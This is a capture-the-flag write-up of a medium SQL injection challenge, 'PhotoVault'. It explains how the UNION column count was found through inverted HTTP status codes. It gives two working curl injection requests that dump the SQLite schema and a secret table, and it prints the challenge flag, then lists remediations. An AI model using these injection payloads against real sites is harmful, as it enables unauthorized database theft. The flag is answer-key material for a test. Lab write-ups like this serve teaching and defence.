# PhotoVault - UNION-based SQLi (SQLite), with a thumbnail-render gotcha

| | |
|---|---|
| **Challenge** | PhotoVault |
| **Category** | SQLI |
| **Points / Difficulty** | 200 / medium |
| **Target** | http://sqli3.chal.deti:8032 |
| **Bug** | CWE-89 - UNION-based SQL injection (SQLite) |

## Hint
> Every frame has a number. Numbers line up in the dark. Count the columns.

## Recon
`/photo/<id>` runs roughly `SELECT id, title, caption, src FROM photos WHERE
id = <input>` with the id injected **raw** (path-based; encode spaces as `%20`).

Two behaviours that confused the column-count step:
- **The app catches SQL errors and returns `200`** (an empty page). So a *wrong*
  UNION column count → caught error → `200`; only the *correct* count returns a
  row.
- **The detail template renders the first character of a column as a
  thumbnail** (`<div class="thumb">h</div>`). On an injected row that column
  must be a **non-empty string** - an integer or `NULL` makes `value[0]` crash →
  `500`.

So the tell-tale was inverted: `UNION SELECT NULL,NULL,NULL,NULL` (4 cols) →
`500` (row returned, then thumbnail crash), every other width → `200`. **Column
count = 4.**

## Approach
UNION with 4 columns, keep the thumbnail column a **string** (`'x'`), carry data
in the two text columns (→ `<h2>` and `<p>`). Dump `sqlite_master`, then read the
secret table.

## Exploitation - the exact requests
```bash
# schema: photos(id,title,caption,src) + vault(item,secret)
curl -s "http://sqli3.chal.deti:8032/photo/99%20UNION%20SELECT%201,'x',group_concat(name),group_concat(sql)%20FROM%20sqlite_master" \
  | sed -n '/class="card"/,/footer/p'

# flag lives in vault.secret
curl -s "http://sqli3.chal.deti:8032/photo/99%20UNION%20SELECT%201,'x',item,secret%20FROM%20vault" \
  | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{2ce0a1ccc8a715b9edd6d7c0ea5db06a}
```
(from `vault` where `item='darkroom'`)

## Root cause & remediation
- **Cause:** the photo id is concatenated straight into the SQL query (CWE-89),
  so a UNION appends an attacker-chosen row from any table.
- **Fix:** use parameterised queries / bound placeholders (`WHERE id = ?`);
  validate the id as an integer; don't store secrets in the same database/schema
  reachable by the public query; return a generic error without leaking row
  structure.

## Notes for the report
- **Column count** determined via the `UNION SELECT NULL,…` width ladder - the
  width that flips the page to `500` (row rendered) is the count (4), because
  wrong widths are swallowed as `200`.
- **Carriers:** `title`/`caption` (text → `<h2>`/`<p>`) are the natural data
  carriers; the `src` column is consumed as a thumbnail letter, so it must stay a
  short string, not the payload.
